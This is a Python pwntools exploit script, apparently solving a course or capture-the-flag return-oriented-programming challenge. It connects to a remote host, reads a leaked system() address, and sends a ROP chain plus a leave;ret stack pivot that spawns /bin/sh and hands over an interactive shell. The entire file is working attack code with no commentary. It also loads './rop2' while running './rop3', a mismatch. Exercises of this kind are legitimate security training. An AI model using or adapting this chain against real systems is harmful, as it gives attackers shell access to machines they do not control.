from pwn import *

context.log_level = 'DEBUG' # set debug logging
context.arch = 'amd64'
REMOTE = True
if REMOTE:
    p = remote('8.154.20.109', 10102)
else:
    p = process('./rop3')

binary = ELF("./rop2")
rop = ROP(binary)
p.recvuntil(b"Please input your StudentID:\n")
p.sendline(b"3220103544")
p.recvuntil(b"gift system address: ")

system_addr = int(p.recv(8).strip(), 16)
ret_addr = 0x00400586
pop_rdi_addr = 0x00400823
gbuffer = 0x006020A0
leave_ret=0x00400700

payload = b"A" * 8
payload += p64(pop_rdi_addr)
payload += p64(gbuffer + 5 * 8)
payload += p64(ret_addr)
payload += p64(system_addr)
payload += b"/bin/sh\x00"

p.sendlineafter(b"\n", payload)


payload = b""
payload += b"A" * 0x40
payload += p64(gbuffer)
payload += p64(leave_ret)
p.sendlineafter(b">", payload)


p.interactive()